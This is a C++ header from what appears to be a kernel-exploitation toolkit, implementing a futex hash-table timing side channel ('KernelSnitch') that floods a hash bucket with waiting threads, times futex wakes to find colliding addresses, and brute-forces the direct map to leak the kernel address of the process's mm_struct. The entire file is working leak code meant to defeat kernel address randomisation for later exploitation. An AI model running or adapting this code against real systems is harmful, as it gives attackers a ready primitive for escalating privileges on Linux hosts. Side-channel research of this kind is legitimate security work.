#pragma once

#include "utils.h"
#include "timeutils.h"
#include "futex_hash.h"
#include "scan_bounds.h"
#include "kernel/target.h"

#include <algorithm>
#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <cstdint>
#include <cassert>
#include <cstdio>
#include <cstdlib>
#include <pthread.h>

#if !defined(__ARM) && !defined(__INTEL) && !defined(__AMD)
#define __INTEL
#endif

/* Measured direct-map end (never wider than the built-in bound). Owned by the
 * address-space layer; KernelSnitch only reads it to bound its scan. */
namespace ghostlock::kernel {
    extern uint64_t g_direct_map_end;
} // namespace ghostlock::kernel

#define FUTEX_SZ (64ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#define APPENDED_FUTEXES 1024
#define MULITPLE 4
#if defined(__INTEL) || defined(__AMD)
#define IDENTITY_START 0xffff888000000000ULL
#define IDENTITY_END   0xffffc88000000000ULL
#define COARSE_SZ (1ULL << 30)
#elif defined(__ARM)
#define VA_BITS 39
#if VA_BITS==39
#define IDENTITY_START (::ghostlock::kernel::KERNELSNITCH_IDENTITY_START)
#define IDENTITY_END   (::ghostlock::kernel::KERNELSNITCH_IDENTITY_END)
// #define IDENTITY_END   0xffffffc000000000ULL
#elif VA_BITS==48
#define IDENTITY_START 0xffff000000000000ULL
#define IDENTITY_END   0xffff800000000000ULL
#else
#error "Unsupported VA_BITS (expected 39 or 48)"
#endif
#define COARSE_SZ (1ULL << 30)
#endif

namespace ghostlock::kernelsnitch {
    enum kernelsnitch_state {
        KERNELSNITCH_NOT_INIT = 0,
        KERNELSNITCH_INIT,
        KERNELSNITCH_COLLISIONS_FOUND,
        KERNELSNITCH_COLLISIONS_NOT_FOUND,
        KERNELSNITCH_MM_FOUND,
        KERNELSNITCH_MM_NOT_FOUND,
        KERNELSNITCH_LAST,
    };

    /* One label per state. The table previously skipped
 * KERNELSNITCH_COLLISIONS_NOT_FOUND, so every later state printed the wrong
 * label and KERNELSNITCH_MM_NOT_FOUND read past the array. */
    static const char *const kernelsnitch_strings[KERNELSNITCH_LAST] = {
        "not initialized", /* KERNELSNITCH_NOT_INIT */
        "initialized", /* KERNELSNITCH_INIT */
        "collisions found", /* KERNELSNITCH_COLLISIONS_FOUND */
        "collisions not found", /* KERNELSNITCH_COLLISIONS_NOT_FOUND */
        "mm_struct found", /* KERNELSNITCH_MM_FOUND */
        "mm_struct not found", /* KERNELSNITCH_MM_NOT_FOUND */
    };

    struct kernelsnitch_shared_state {
        volatile size_t mm_struct_sz;
        volatile size_t mm_slab_order;
        volatile size_t verbose;

        size_t collisions;
        size_t thread_cnt;
        size_t cpu_cnt;
        size_t futex_hash_table_size;
        size_t total_futexes;
        FutexHashContext futex_hash;

        volatile unsigned char *futexes;
        volatile unsigned char inc_futex[PAGE_SIZE];

        volatile size_t *futex_addrs;
        volatile size_t *times;
        volatile size_t found;
        volatile size_t mm_struct;
        volatile size_t scan_done;

        pthread_t *tids;
        size_t identity_diff;

        enum kernelsnitch_state state;
    };

    /* KernelSnitchContext remains mmap-backed because collision discovery may run
 * in a helper process. The typedef gives callers an owned lifecycle type while
 * preserving the shared layout and worker argument ABI during migration. */
    typedef struct kernelsnitch_shared_state KernelSnitchContext;

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

    /**
 * FUTEX syscall
 */
    static int32_t __futex(uint32_t *uaddr, int32_t futex_op, uint32_t val, const struct timespec *timeout,
                       uint32_t *uaddr2, uint32_t val3) {
        return static_cast<int32_t>(syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3));
    }

    /**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
    struct inc_arg {
        struct kernelsnitch_shared_state *ks;
        size_t id;
    };

    static void *__do_increase(void *arg) {
        struct inc_arg *inc_arg = static_cast<struct inc_arg *>(arg);
        struct kernelsnitch_shared_state *ks = inc_arg->ks;
        size_t id = inc_arg->id;
        SYSCHK(__futex((uint32_t *) &ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, nullptr, nullptr, 0));
        free(inc_arg);
        return 0;
    }

    /**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
    /* TODO(CPP06-KS-RAII): a partial worker-start failure is only logged here; the
 * failure-injection coverage remains a maintenance item. Completion: cover the
 * failure path, then delete this comment and the residual row. */
    static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount) {
        pthread_t tid;
        for (size_t i = 0; i < amount; ++i) {
            auto *inc_arg = static_cast<struct inc_arg *>(
                calloc(1, sizeof(struct inc_arg)));
            inc_arg->id = id; // NOLINT(clang-analyzer-nullability.NullableDereferenced)
            inc_arg->ks = ks;
            int32_t err = pthread_create(&tid, 0, __do_increase, (void *) inc_arg);
            if (err)
                pr_error("pthread_create failed: %s\n", strerror(err));
            err = pthread_detach(tid);
            if (err)
                pr_error("pthread_detach failed: %s\n", strerror(err));
        }
        WAIT();
    }

    /**
 * Simple compare
 */
#define MEASURE_FAST_REPEAT 8
#define MEASURE_FAST_AVG    4
#define MEASURE_SLOW_REPEAT 16
#define MEASURE_SLOW_AVG    8

    static int32_t __compare(const void *a, const void *b) {
        return static_cast<int32_t>(*(size_t *) a - *(size_t *) b);
    }

    /**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @arg repeat: samples per measurement
 * @arg avg: lowest samples used for the average
 * @return averaged time of the futex wait operation
 */
    static size_t __measure(size_t futex_addr, size_t repeat, size_t avg) {
        size_t t0;
        size_t t1;
        size_t time = 0;
        // do some simple signal processing and reject bad ones
        size_t __times[16];
        for (size_t l = 0; l < repeat; ++l) {
            sched_yield();
            t0 = ghostlock::kernel::rdtsc_begin();
            SYSCHK(__futex((uint32_t *) futex_addr, FUTEX_WAKE_PRIVATE, 0, nullptr, nullptr, 0));
            t1 = ghostlock::kernel::rdtsc_end();
            __times[l] = t1 - t0;
        }
        qsort(__times, repeat, sizeof(size_t), __compare);
        for (size_t l = 0; l < avg; ++l)
            time += __times[l];
        time /= avg;
        return time;
    }

    /**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
    struct range {
        size_t id;
        size_t start;
        size_t end;
    };

    struct mm_leak_arg {
        struct kernelsnitch_shared_state *ks;
        struct range range;
        int32_t try_canonical;
        int32_t sweep_tags;
    };

    static int32_t __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t candidate) {
        for (size_t i = 1; i < ks->collisions; ++i) {
            if (futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[0], candidate) !=
                futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[i], candidate))
                return 0;
        }
        return 1;
    }

    static void __mm_mark_found(struct kernelsnitch_shared_state *ks, size_t candidate) {
        if (ks->verbose)
            pr_info("found mm_struct %016zx\n", candidate);
        ks->mm_struct = candidate;
        ks->found = 1;
    }

    static void *__mm_leak(void *arg) {
        struct mm_leak_arg *mm_leak_arg = static_cast<struct mm_leak_arg *>(arg);
        struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
        struct range *range = &mm_leak_arg->range;
        if (ks->verbose)
            pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start,
                    range->end);
        /* Keep the shift in size_t: PAGE_SIZE is an int macro, so the old
         * expression converted a signed result (the only -Wsign-conversion
         * warning in the build). MM_ORDER is small; the value is unchanged. */
        const size_t mm_slab_sz =
                static_cast<size_t>(PAGE_SIZE) << ks->mm_slab_order;
        for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
            if ((coarse_addr % (1ULL << 40)) == 0)
                if (ks->verbose)
                    pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr,
                            coarse_addr + (1ULL << 40));
            size_t slab_end = ghostlock::kernelsnitch::scan_limit(coarse_addr, COARSE_SZ, range->end);
            for (size_t slab_addr = coarse_addr; (slab_addr < slab_end) && !ks->found; slab_addr += mm_slab_sz) {
                size_t slab_limit = ghostlock::kernelsnitch::scan_limit(slab_addr, mm_slab_sz, slab_end);
                for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found;
                     mm_struct_candidate += ks->mm_struct_sz) {
                    if (mm_leak_arg->try_canonical) {
                        size_t canonical_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
                        if (__mm_candidate_matches(ks, canonical_candidate)) {
                            __mm_mark_found(ks, canonical_candidate);
                            break;
                        }
                    }

                    if (mm_leak_arg->sweep_tags) {
                        for (size_t tag_candidate = 0; tag_candidate < 16 && !ks->found; ++tag_candidate) {
                            if (tag_candidate == 15)
                                continue;
                            size_t tagged_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (tag_candidate << 56);
                            if (__mm_candidate_matches(ks, tagged_candidate)) {
                                __mm_mark_found(ks, tagged_candidate);
                                break;
                            }
                        }
                    }
                }
            }
        }
        free(mm_leak_arg);
        return 0;
    }

    static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags) {
        /* the leak check discards a match past the measured end, so no slice
     * scans past it */
        const size_t ceiling = std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
                                                  static_cast<uint64_t>(IDENTITY_END));
        for (size_t i = 0; i < ks->thread_cnt; ++i) {
            struct mm_leak_arg *mm_leak_arg = static_cast<struct mm_leak_arg *>(SYSCHK(
                calloc(1, sizeof(struct mm_leak_arg))));
            mm_leak_arg->ks = ks; // NOLINT(clang-analyzer-nullability.NullableDereferenced)
            mm_leak_arg->range.id = i;
            mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff * i;
            mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff * (i + 1);
            mm_leak_arg->try_canonical = try_canonical;
            mm_leak_arg->sweep_tags = sweep_tags;
            if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
                mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
            if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
                mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
            if (mm_leak_arg->range.end > ceiling)
                mm_leak_arg->range.end = ceiling;
            SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
        }
        for (size_t i = 0; i < ks->thread_cnt; ++i)
            pthread_join(ks->tids[i], 0);
    }

    /****************************************************************************************************************/
    /* EXTERNAL FUNCTIONS                                                                                           */
    /****************************************************************************************************************/

    /**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info, 1 enables and 0 disables
 * @arg __pin_cpu: CPU the calling thread is pinned to for the search
 * @return shared KernelSnitch state
 */
    KernelSnitchContext *context_init(size_t __mm_struct_sz,
                                      size_t __mm_slab_order,
                                      size_t __thread_cnt,
                                      size_t __collision_cnt,
                                      size_t __verbose,
                                      size_t __pin_cpu) {
        auto *ks = static_cast<KernelSnitchContext *>(SYSCHK(mmap(
            0, sizeof(KernelSnitchContext), PROT_WRITE | PROT_READ,
            MAP_ANON | MAP_SHARED, -1, 0)));
        ks->mm_struct = static_cast<size_t>(-1);
        ks->scan_done = 0;
        ks->mm_struct_sz = __mm_struct_sz;
        ks->mm_slab_order = __mm_slab_order;
        size_t online_cpu_cnt = static_cast<size_t>(SYSCHK(sysconf(_SC_NPROCESSORS_ONLN)));
        /* The kernel table follows the possible CPUs, not the online subset. */
        size_t possible_cpu_cnt = static_cast<size_t>(sysconf(_SC_NPROCESSORS_CONF));
        if (possible_cpu_cnt == 0)
            possible_cpu_cnt = online_cpu_cnt;
        ks->cpu_cnt = online_cpu_cnt * 2;
        ks->thread_cnt = __thread_cnt;
        ks->collisions = __collision_cnt;
        ks->verbose = __verbose;

        // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
        ks->futex_hash_table_size = futex_hash_table_size_for(possible_cpu_cnt);
        SYSCHK(futex_hash_context_init(&ks->futex_hash, ks->futex_hash_table_size));
        ks->total_futexes = ks->futex_hash_table_size * ks->collisions * MULITPLE;
        ks->times = static_cast<volatile size_t *>(SYSCHK(mmap(0, sizeof(size_t) * ks->total_futexes,
                                                               PROT_WRITE | PROT_READ,
                                                               MAP_ANON | MAP_SHARED, -1, 0)));
        ks->tids = static_cast<pthread_t *>(SYSCHK(mmap(0, sizeof(pthread_t) * ks->thread_cnt, PROT_WRITE | PROT_READ,
                                                        MAP_ANON | MAP_SHARED, -1, 0)));
        ks->futexes = static_cast<volatile unsigned char *>(SYSCHK(mmap(
            0, FUTEX_SZ, PROT_NONE, MAP_ANON | MAP_PRIVATE | MAP_NORESERVE, -1, 0)));
        for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
            SYSCHK(mmap((void *) ((size_t) ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE | PROT_READ,
                        MAP_ANON | MAP_SHARED | MAP_FIXED, -1, 0));
        /* mm_structs live in the direct map, so the scan stops at its end and never
     * past the identity range the futexes are drawn from */
        ks->identity_diff =
                ((std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
                                     static_cast<uint64_t>(IDENTITY_END)) -
                  static_cast<uint64_t>(IDENTITY_START)) / ks->thread_cnt);

        ks->futex_addrs = static_cast<volatile size_t *>(SYSCHK(mmap(0, sizeof(size_t) * (ks->collisions + 1),
                                                                     PROT_WRITE | PROT_READ,
                                                                     MAP_ANON | MAP_SHARED, -1, 0)));

        if (ks->verbose)
            pr_info(
                "parameters cpu (%zu online, %zu possible, futex table %zu) mm_struct sz (%zx) mm slab order (%zu) thread cnt (%zu) collisions (%zu)\n",
                ks->cpu_cnt,
                possible_cpu_cnt,
                ks->futex_hash_table_size,
                ks->mm_struct_sz,
                ks->mm_slab_order,
                ks->thread_cnt,
                ks->collisions);
        ghostlock::kernel::pin_to_core(__pin_cpu);

        ks->state = KERNELSNITCH_INIT;
        return ks;
    }

#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 10
#endif
#ifndef KERNELSNITCH_COLLISION_POOL
#define KERNELSNITCH_COLLISION_POOL 64
#endif
#ifndef KERNELSNITCH_EARLY_PROBE_MIN_EXTRA
#define KERNELSNITCH_EARLY_PROBE_MIN_EXTRA 4
#endif
#ifndef KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA
#define KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA 3
#endif
#ifndef KERNELSNITCH_EARLY_CHEAP_POOL
#define KERNELSNITCH_EARLY_CHEAP_POOL 16
#endif

    typedef struct {
        size_t t, addr;
    } coll_cand_t;

    static size_t __collision_pool_limit(size_t wanted, size_t verify_limit) {
        if (verify_limit < wanted)
            verify_limit = wanted;
        if (verify_limit > KERNELSNITCH_COLLISION_POOL)
            verify_limit = KERNELSNITCH_COLLISION_POOL;
        return verify_limit;
    }

    static size_t __screen_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *best,
                                          size_t verify_approx_time, size_t verify_repeat, size_t verify_avg,
                                          size_t verify_limit, coll_cand_t *verified) {
        size_t wanted = ks->collisions - 1;
        size_t n_verified = 0;
        verify_limit = __collision_pool_limit(wanted, verify_limit);
        if (ks->verbose) pr_info("screening piled candidates limit=%zu\n", verify_limit);
        for (size_t j = 0; j < verify_limit && best[j].t; ++j) {
            size_t t1 = __measure(best[j].addr, verify_repeat, verify_avg);
            if (t1 > verify_approx_time * KERNELSNITCH_THRESHOLD_MULT) {
                verified[n_verified].t = t1;
                verified[n_verified].addr = best[j].addr;
                n_verified++;
                if (ks->verbose) pr_info("  piled   %016zx scan=%zu verify=%zu\n", best[j].addr, best[j].t, t1);
            } else if (ks->verbose) {
                pr_info("  reject   %016zx scan=%zu verify=%zu\n", best[j].addr, best[j].t, t1);
            }
        }
        return n_verified;
    }

    static size_t __prove_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *verified, size_t n_verified,
                                         size_t verify_approx_time, size_t verify_repeat, size_t verify_avg, size_t id,
                                         int32_t drain_on_short) {
        size_t wanted = ks->collisions - 1;
        /* pass 1 drains the pile.
       Piled-bucket colliders collapse while ambient buckets stay slow. */
        __futex(reinterpret_cast<uint32_t *>(const_cast<unsigned char *>(&ks->inc_futex[id])), FUTEX_WAKE_PRIVATE,
                APPENDED_FUTEXES, nullptr, nullptr, 0);
        usleep(200000);
        size_t alive[KERNELSNITCH_COLLISION_POOL];
        size_t alive_t[KERNELSNITCH_COLLISION_POOL];
        size_t n_alive = 0;
        if (ks->verbose) pr_info("verifying %zu candidates after pile drain\n", n_verified);
        for (size_t j = 0; j < n_verified; ++j) {
            size_t t2 = __measure(verified[j].addr, verify_repeat, verify_avg);
            if (t2 < verified[j].t / 2) {
                alive[n_alive] = verified[j].addr;
                alive_t[n_alive] = verified[j].t;
                n_alive++;
                if (ks->verbose) pr_info("  drained  %016zx t=%zu after=%zu\n", verified[j].addr, verified[j].t, t2);
            } else if (ks->verbose) {
                pr_info("  reject   %016zx t=%zu after=%zu\n", verified[j].addr, verified[j].t, t2);
            }
        }
        /* pass 2 re-piles.
       Only real colliders go slow again. */
        __increase(ks, id, APPENDED_FUTEXES);
        size_t count = 0;
        for (size_t j = 0; j < n_alive && count < wanted; ++j) {
            size_t t3 = __measure(alive[j], verify_repeat, verify_avg);
            if (t3 > verify_approx_time * KERNELSNITCH_THRESHOLD_MULT) {
                ks->futex_addrs[++count] = alive[j];
                if (ks->verbose) pr_info("  collider %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
            } else if (ks->verbose) {
                pr_info("  reject   %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
            }
        }
        if (count < wanted && drain_on_short) {
            /* leave the bucket drained so a conservative retry starts clean */
            __futex(reinterpret_cast<uint32_t *>(const_cast<unsigned char *>(&ks->inc_futex[id])),
                    FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, nullptr, nullptr, 0);
            usleep(200000);
        }
        return count;
    }

    static size_t __verify_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *best,
                                          size_t verify_approx_time, size_t verify_repeat, size_t verify_avg,
                                          size_t verify_limit, size_t id, int32_t drain_on_short) {
        coll_cand_t verified[KERNELSNITCH_COLLISION_POOL];
        size_t n_verified = __screen_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg,
                                                    verify_limit,
                                                    verified);
        return __prove_collision_pool(ks, verified, n_verified, verify_approx_time, verify_repeat, verify_avg, id,
                                      drain_on_short);
    }

    /* One full scan pass returns confirmed colliders, excluding the target */
    static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan_repeat, size_t scan_avg,
                                   size_t verify_repeat, size_t verify_avg) {
#define ID 128
        size_t wanted = ks->collisions - 1;
        size_t scan_approx_time = std::min(__measure((size_t) &ks->futexes[0], scan_repeat, scan_avg),
                                           __measure((size_t) &ks->futexes[4096 + 8], scan_repeat, scan_avg));
        size_t verify_approx_time = std::min(__measure((size_t) &ks->futexes[0], verify_repeat, verify_avg),
                                             __measure((size_t) &ks->futexes[4096 + 8], verify_repeat, verify_avg));

        /* piled-up hash bucket ID 128 */
        __increase(ks, ID, APPENDED_FUTEXES);
        if (ks->verbose)
            pr_info("pass scan=%zu/%zu verify=%zu/%zu\n", scan_repeat, scan_avg, verify_repeat,
                    verify_avg);

        ks->futex_addrs[0] = (size_t) &ks->inc_futex[ID];
        if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
        /* pool of slow candidates, verified below */
        auto *best = static_cast<coll_cand_t *>(
            calloc(KERNELSNITCH_COLLISION_POOL, sizeof(coll_cand_t)));
        ASSERT_pr(best, "calloc best\n");
        size_t cheap_probe_extra = std::max((wanted + 2) / 3, (size_t) KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA);
        size_t cheap_probe_after = ks->futex_hash_table_size * (wanted + cheap_probe_extra);
        size_t full_probe_extra = std::max((wanted + 1) / 2, (size_t) KERNELSNITCH_EARLY_PROBE_MIN_EXTRA);
        size_t full_probe_after = ks->futex_hash_table_size * (wanted + full_probe_extra);
        int32_t cheap_probed = (cheap_probe_after >= full_probe_after ||
                            cheap_probe_after >= ks->total_futexes ||
                            wanted > KERNELSNITCH_EARLY_CHEAP_POOL ||
                            wanted > KERNELSNITCH_COLLISION_POOL);
        int32_t full_probed = (full_probe_after >= ks->total_futexes || wanted > KERNELSNITCH_COLLISION_POOL);
        for (size_t i = 2; i < ks->total_futexes; ++i) {
            if (ks->verbose && (i % 256) == 0)
                pr_info("  collision scan %zu/%zu\n", i, ks->total_futexes);
            size_t id = (i * 4096) | (i * 8 % 4096);
            if (id >= FUTEX_SZ)
                break;
            size_t futex_addr = (size_t) &ks->futexes[id];
            ks->scan_done = i;
            ks->times[i] = __measure(futex_addr, scan_repeat, scan_avg);
            if (ks->times[i] > (scan_approx_time * KERNELSNITCH_THRESHOLD_MULT)) {
                size_t pos = KERNELSNITCH_COLLISION_POOL;
                for (size_t j = 0; j < KERNELSNITCH_COLLISION_POOL; ++j) {
                    if (ks->times[i] > best[j].t) {
                        pos = j;
                        break;
                    }
                }
                if (pos < KERNELSNITCH_COLLISION_POOL) {
                    for (size_t j = KERNELSNITCH_COLLISION_POOL - 1; j > pos; --j)
                        best[j] = best[j - 1];
                    best[pos].t = ks->times[i];
                    best[pos].addr = futex_addr;
                }
            }
            if (!cheap_probed && i >= cheap_probe_after && best[wanted - 1].t) {
                cheap_probed = 1;
                coll_cand_t cheap_verified[KERNELSNITCH_COLLISION_POOL];
                size_t screened = __screen_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg,
                                                          KERNELSNITCH_EARLY_CHEAP_POOL, cheap_verified);
                pr_info("[spray] early collision screen %zu/%zu at %zu%%\n",
                        screened, wanted, ks->total_futexes ? i * 100 / ks->total_futexes : 0);
                if (screened >= wanted) {
                    size_t count = __prove_collision_pool(ks, cheap_verified, screened, verify_approx_time,
                                                          verify_repeat,
                                                          verify_avg, ID, 0);
                    if (count == wanted) {
                        free(best);
                        return count;
                    }
                    if (ks->verbose)
                        pr_info("early small proof found %zu/%zu collisions, continuing scan\n", count,
                                wanted);
                }
            }
            if (!full_probed && i >= full_probe_after && best[wanted - 1].t) {
                full_probed = 1;
                if (ks->verbose) pr_info("early verifying at scan %zu/%zu\n", i, ks->total_futexes);
                size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg,
                                                       KERNELSNITCH_COLLISION_POOL, ID, 0);
                if (count == wanted) {
                    free(best);
                    return count;
                }
                if (ks->verbose)
                    pr_info("early verification found %zu/%zu collisions, continuing scan\n", count,
                            wanted);
            }
        }
        size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg,
                                               KERNELSNITCH_COLLISION_POOL, ID, 1);
        free(best);
        return count;
#undef ID
    }

    /**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
    /* Execute collision discovery. Input/output: KernelSnitchContext; output:
 * collision set and state transition retained by the context. */
    void context_find_collisions(KernelSnitchContext *ks) {
        ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
        ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
        if (ks->verbose) pr_info("start finding collisions\n");

        size_t wanted = ks->collisions - 1;
        size_t count = __collision_pass(ks, MEASURE_FAST_REPEAT, MEASURE_FAST_AVG, MEASURE_SLOW_REPEAT,
                                        MEASURE_SLOW_AVG);
        if (count < wanted) {
            pr_warning("fast pass found %zu/%zu collisions; retrying conservative\n", count, wanted);
            count = __collision_pass(ks, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
        }
        if (wanted == count) {
            if (ks->verbose) pr_info("found %zu collisions\n", count);
            ks->state = KERNELSNITCH_COLLISIONS_FOUND;
        } else {
            pr_warning("only found %zu collisions -> cannot continue\n", count);
            ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        }
    }

    int32_t context_has_collisions(const KernelSnitchContext *ks) {
        ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND),
                  "wrong state\n");
        return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
    }

    /**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
    /* Execute address scanning using discovered collisions. Input/output:
 * KernelSnitchContext; output: 0 on a selected address, -1 otherwise. */
    int32_t context_scan(KernelSnitchContext *ks) {
        ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
        if (ks->verbose) pr_info("start bruteforcing\n");
        ghostlock::kernel::reset_cpu_pin();

        __run_mm_leak_pass(ks, 1, 0);
        if (!ks->found)
            __run_mm_leak_pass(ks, 0, 1);
        ks->state = (ks->mm_struct == static_cast<size_t>(-1)) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
        return ks->state == KERNELSNITCH_MM_FOUND ? 0 : -1;
    }

    /**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
    /* Read and release are deliberately separate: result borrows the immutable
 * context, while destroy consumes all mmap-backed context storage. */
    size_t context_result(const KernelSnitchContext *ks) {
        return ks ? ks->mm_struct : static_cast<size_t>(-1);
    }

    void context_destroy(KernelSnitchContext *ks) {
        if (!ks) return;
        munmap((void *) ks->times, sizeof(size_t) * ks->total_futexes);
        ks->times = 0;
        munmap((void *) ks->tids, sizeof(pthread_t) * ks->thread_cnt);
        ks->tids = 0;
        munmap((void *) ks->futex_addrs, sizeof(size_t) * (ks->collisions + 1));
        ks->futex_addrs = 0;
        munmap((void *) ks->futexes, FUTEX_SZ);
        ks->futexes = 0;
        if (ks->verbose) pr_info("done\n");
        munmap(ks, sizeof(KernelSnitchContext));
    }

    /**
 * Prints the current execution state KernelSnitch is in
 * @arg ks: shared KernelSnitch state
 */
    void print_state(struct kernelsnitch_shared_state *ks) {
        pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
    }

    /**
 * Prints the found collisions
 * @arg ks: shared KernelSnitch state
 */
    void print_collisions(struct kernelsnitch_shared_state *ks) {
        pr_info("collisions:\n");
        for (size_t i = 2; i < ks->collisions; ++i) {
            size_t addr = ks->futex_addrs[i];
            pr_info("  %016zx\n", addr);
        }
    }


    /* The KernelSnitchOwner block below is C++-only; the C façade is gone. */

#include <utility>

    /* Owning RAII handle for one KernelSnitchContext. The mmap-backed shared
 * layout and the C entry points above stay unchanged; this type only makes the
 * single owner and the explicit init -> find -> scan -> result -> destroy order
 * visible at the call site. destroy releases user-space mappings only, so the
 * destructor is safe on every exit path, including a missed search. A forked
 * leak child borrows the raw context through get() and must never reset it. */
    class KernelSnitchOwner final {
    public:
        KernelSnitchOwner() noexcept = default;

        ~KernelSnitchOwner() noexcept { reset(); }

        KernelSnitchOwner(const KernelSnitchOwner &) = delete;

        KernelSnitchOwner &operator=(const KernelSnitchOwner &) = delete;

        KernelSnitchOwner(KernelSnitchOwner &&other) noexcept
            : context_(std::exchange(other.context_, nullptr)) {
        }

        KernelSnitchOwner &operator=(KernelSnitchOwner &&other) noexcept {
            if (this != &other) {
                reset();
                context_ = std::exchange(other.context_, nullptr);
            }
            return *this;
        }

        [[nodiscard]] static KernelSnitchOwner create(size_t mm_struct_sz,
                                                      size_t mm_slab_order,
                                                      size_t thread_cnt,
                                                      size_t collision_cnt,
                                                      size_t verbose,
                                                      size_t pin_cpu) noexcept {
            return KernelSnitchOwner(kernelsnitch::context_init(
                mm_struct_sz, mm_slab_order, thread_cnt, collision_cnt, verbose,
                pin_cpu));
        }

        [[nodiscard]] KernelSnitchContext *get() const noexcept { return context_; }
        [[nodiscard]] bool valid() const noexcept { return context_ != nullptr; }

        void find_collisions() const {
            kernelsnitch::context_find_collisions(context_);
        }

        [[nodiscard]] bool has_collisions() const {
            return kernelsnitch::context_has_collisions(context_) != 0;
        }

        [[nodiscard]] int32_t scan() const {
            return kernelsnitch::context_scan(context_);
        }

        [[nodiscard]] size_t result() const {
            return kernelsnitch::context_result(context_);
        }

        void reset() noexcept {
            if (context_) {
                kernelsnitch::context_destroy(context_);
                context_ = nullptr;
            }
        }

    private:
        explicit KernelSnitchOwner(KernelSnitchContext *context) noexcept
            : context_(context) {
        }

        KernelSnitchContext *context_ = nullptr;
    };
} // namespace ghostlock::kernelsnitch
